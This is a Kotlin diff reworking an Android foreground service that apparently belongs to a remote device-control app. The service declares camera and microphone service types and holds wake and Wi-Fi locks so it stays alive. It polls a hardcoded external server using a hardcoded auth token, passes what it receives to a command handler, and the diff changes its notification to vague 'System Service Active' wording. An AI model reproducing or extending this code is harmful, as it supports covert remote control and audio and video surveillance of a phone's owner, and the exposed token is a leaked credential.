@@ -6,10 +6,11 @@ import android.os.*
 import android.util.Log
 import android.content.pm.ServiceInfo
 import androidx.core.app.NotificationCompat
-import androidx.lifecycle.LifecycleService
+import android.net.wifi.WifiManager
 
-class ControlService : LifecycleService() {
+class ControlService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
+    private var wifiLock: WifiManager.WifiLock? = null
     private lateinit var pollingManager: PollingManager
     private lateinit var commandHandler: CommandHandler
 
@@ -19,29 +20,29 @@ class ControlService : LifecycleService() {
         private const val TAG = "ControlService"
     }
 
+    override fun onBind(intent: Intent?): IBinder? = null
+
     override fun onCreate() {
+        super.onCreate()
         createNotificationChannel()
-        if (Build.VERSION.SDK_INT >= 34) { 
-            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        
+        // Android 14+ support dengan literal angka (Safe-Build)
+        if (Build.VERSION.SDK_INT >= 34) {
+            val type = 1073741824 or 64 or 128 // specialUse | camera | microphone
             startForeground(NOTIFICATION_ID, createNotification(), type)
         } else {
             startForeground(NOTIFICATION_ID, createNotification())
         }
-        super.onCreate()
-        Log.d(TAG, "Service Created & Polling Started")
-
-        acquireWakeLock()
         
-        // Read config
+        Log.d(TAG, "Service Created")
+        acquireLocks()
+        
         val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
         val serverUrl = prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: ""
         val devId = prefs.getString("device_id", "my_phone") ?: "unknown"
         val authToken = prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: ""
         val isTurbo = prefs.getBoolean("turbo_mode", true)
         
-        // Normalisasikan URL
         var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
         if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)
 
@@ -50,49 +51,49 @@ class ControlService : LifecycleService() {
         pollingManager.start()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        super.onStartCommand(intent, flags, startId)
-        return START_STICKY
-    }
+    private fun acquireLocks() {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceControl::WakeLock")
+        wakeLock?.acquire()
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= 26) {
-            val serviceChannel = NotificationChannel(
-                CHANNEL_ID,
-                "Device Control Background Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(serviceChannel)
-        }
+        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "DeviceControl::WifiLock")
+        wifiLock?.acquire()
     }
 
     private fun createNotification(): Notification {
-        val pendingIntent: PendingIntent = Intent(this, MainActivity::class.java).let { notificationIntent ->
-            PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)
-        }
+        val pendingIntent = PendingIntent.getActivity(
+            this, 0, Intent(this, MainActivity::class.java),
+            PendingIntent.FLAG_IMMUTABLE
+        )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Background check status")
-            .setContentText("Service normal")
+            .setContentTitle("System Service Active")
+            .setContentText("Monitoring background tasks...")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setPriority(NotificationCompat.PRIORITY_MAX) // Prioritas tertinggi
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
             .setContentIntent(pendingIntent)
             .build()
     }
 
-    private fun acquireWakeLock() {
-        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceControl::WakeLock")
-        wakeLock?.acquire()
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            val channel = NotificationChannel(CHANNEL_ID, "Background Service", NotificationManager.IMPORTANCE_HIGH)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        return START_STICKY
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        if (::pollingManager.isInitialized) {
-            pollingManager.stop()
-        }
+        pollingManager.stop()
         wakeLock?.let { if (it.isHeld) it.release() }
-        Log.d(TAG, "Service Destroyed")
+        wifiLock?.let { if (it.isHeld) it.release() }
     }
 }
